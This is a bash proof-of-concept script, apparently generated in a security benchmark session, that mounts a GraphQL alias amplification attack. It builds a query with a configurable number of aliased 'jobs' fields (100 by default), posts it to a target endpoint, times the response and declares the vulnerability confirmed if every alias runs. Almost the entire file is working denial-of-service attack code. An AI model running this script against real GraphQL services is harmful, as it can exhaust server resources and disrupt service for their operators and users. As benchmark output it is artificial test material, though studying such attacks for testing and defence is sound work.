#!/bin/bash
# POC: GraphQL Alias Amplification Attack v2 - Fixed JSON escaping for proper payload construction
# Target: ./repo
# Created: 2025-11-10T15:06:29.935Z
# Session: benchmark-XBEN-038-24-mht9rpjz

# GraphQL Alias Amplification DoS POC - Version 2
# Fixed JSON escaping
# This script demonstrates a query multiplication attack using GraphQL aliases

TARGET_URL="${1:-http://localhost:8000/graphql/}"
NUM_ALIASES="${2:-100}"

echo "[*] GraphQL Alias Amplification DoS POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Number of aliases to generate: $NUM_ALIASES"
echo ""

# Build GraphQL query with jq for proper JSON escaping
# Generate aliases using jq to build the query properly
QUERY_PARTS=""

for i in $(seq 0 $((NUM_ALIASES - 1))); do
    QUERY_PARTS="${QUERY_PARTS}a${i}: jobs(jobType: \"all\") { id } "
done

# Build complete query
GRAPHQL_QUERY="{${QUERY_PARTS}}"

# Use jq to create properly escaped JSON payload
PAYLOAD=$(jq -n \
  --arg query "$GRAPHQL_QUERY" \
  '{query: $query}')

echo "[*] Sending query with $NUM_ALIASES aliases..."
echo "[*] Query preview (first 150 chars): ${GRAPHQL_QUERY:0:150}..."
echo ""

# Send request and measure response time
START_TIME=$(date +%s%N)

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD")

END_TIME=$(date +%s%N)
DURATION_MS=$(( (END_TIME - START_TIME) / 1000000 ))

# Extract HTTP status code (last line)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
# Extract response body (everything except last line)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo "[*] Response Time: ${DURATION_MS}ms"
echo "[*] Response Size: $(echo "$BODY" | wc -c) bytes"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: Server accepted aliased query with HTTP 200"
    
    # Check if response contains data from aliases
    if echo "$BODY" | grep -q '"data"'; then
        # Count aliases in response (look for pattern like "a0", "a1", etc.)
        ALIAS_COUNT=$(echo "$BODY" | grep -o '"a[0-9]\+":' | wc -l)
        echo "[+] Aliases executed in response: $ALIAS_COUNT"
        echo "[+] VULNERABILITY CONFIRMED: Server processes all $NUM_ALIASES aliases without limits"
        echo ""
        echo "[*] Response preview (first 400 chars):"
        echo "$BODY" | head -c 400
        echo ""
        echo "..."
        exit 0
    else
        echo "[-] Unexpected response format"
        echo "[*] Full response:"
        echo "$BODY"
        exit 1
    fi
elif [ "$HTTP_CODE" = "400" ]; then
    echo "[-] HTTP 400 - Bad Request"
    echo "[*] Response:"
    echo "$BODY"
    echo ""
    echo "[!] This might indicate the GraphQL endpoint requires different query format"
    exit 1
else
    echo "[-] Unexpected HTTP status: $HTTP_CODE"
    echo "[*] Response:"
    echo "$BODY"
    exit 1
fi